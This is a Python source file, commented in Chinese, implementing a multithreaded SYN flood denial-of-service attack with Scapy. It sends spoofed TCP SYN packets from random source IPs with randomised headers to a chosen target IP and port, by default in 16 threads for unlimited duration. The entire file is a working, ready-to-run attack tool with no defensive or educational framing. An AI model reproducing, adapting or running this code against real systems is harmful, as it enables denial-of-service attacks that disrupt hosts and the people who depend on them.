from scapy.all import *
import random
import threading
import time
import signal
from ipaddress import IPv4Address
from Animation_v3 import Animation

# 全局控制变量
running = False

o_print = print

def print(*args, **kwargs):
    """清空当前行"""
    o_print("\r", end='')
    o_print(*args, **kwargs)

def send_syn_packets(target_ip, target_port, thread_id):
    """
    多线程SYN泛洪攻击 - 持续发送版本
    """
    print(f"线程 {thread_id} 启动，持续发送SYN数据包")
    packet_counter = 0
    while running:
        try:
            # 随机化IP层参数
            src_ip = str(IPv4Address(random.getrandbits(32)))
            ip_id = random.randint(1, 65535)
            ip_ttl = random.randint(30, 255)
            
            ip_layer = IP(
                src=src_ip, 
                dst=target_ip,
                id=ip_id,
                ttl=ip_ttl
            )
            
            # 随机化TCP层参数
            src_port = random.randint(1024, 65535)
            seq_num = random.getrandbits(32)
            window_size = random.randint(1024, 65535)
            
            tcp_layer = TCP(
                sport=src_port,
                dport=target_port,
                flags="S",
                seq=seq_num,
                window=window_size
            )
            
            # 发送数据包
            packet = ip_layer / tcp_layer
            send(packet, verbose=0)
            packet_counter += 1
            
            # 每发送100个包打印一次状态
            # if packet_counter % 100 == 0:
                # print(f"线程 {thread_id} 已发送 {packet_counter} 个数据包")
                
        except Exception as e:
            print(f"线程 {thread_id} 发送错误: {e}")
    
    print(f"线程 {thread_id} 停止，总共发送 {packet_counter} 个数据包")

def signal_handler(sig, frame):
    """处理Ctrl+C信号"""
    global running
    print("\n检测到Ctrl+C，正在停止攻击...")
    running = False

def advanced_syn_flood(target_ip, target_port, thread_count=5, duration=None):
    """
    高级SYN泛洪攻击 - 持续发送版本
    参数:
        target_ip: 目标IP
        target_port: 目标端口
        thread_count: 线程数
        duration: 攻击持续时间(秒)，None表示无限运行
    """
    global running
    
    print(f"开始高级SYN泛洪攻击，目标: {target_ip}:{target_port}")
    print(f"配置: {thread_count} 个线程")
    
    if duration is not None:
        print(f"攻击将持续 {duration} 秒")
    else:
        print("攻击将无限运行，使用Ctrl+C停止")
    animation = Animation("攻击进行中", 10)
    animation.start()    
    # 注册信号处理器
    signal.signal(signal.SIGINT, signal_handler)
    
    running = True
    threads = []
    
    # 创建并启动线程
    for i in range(thread_count):
        thread = threading.Thread(
            target=send_syn_packets,
            args=(target_ip, target_port, i)
        )
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # 如果有持续时间限制，设置定时停止
    if duration is not None:
        def stop_after_duration():
            time.sleep(duration)
            global running
            if running:
                print(f"\n达到持续时间 {duration} 秒，停止攻击")
                running = False
        
        timer_thread = threading.Thread(target=stop_after_duration)
        timer_thread.daemon = True
        timer_thread.start()
    
    # 等待所有线程完成
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\n正在停止所有线程...")
        running = False
        for thread in threads:
            thread.join()
    
    animation.stop()
    print("所有线程已完成，攻击结束")

# 使用示例
if __name__ == "__main__":
    target_ip = "192.168.1.1"    # 替换为目标IP
    target_port = 52             # 替换为目标端口
    threads = 16                 # 线程数
    duration = None                # 持续时间(秒)，设为 None 表示无限运行
    
    advanced_syn_flood(target_ip, target_port, threads, duration)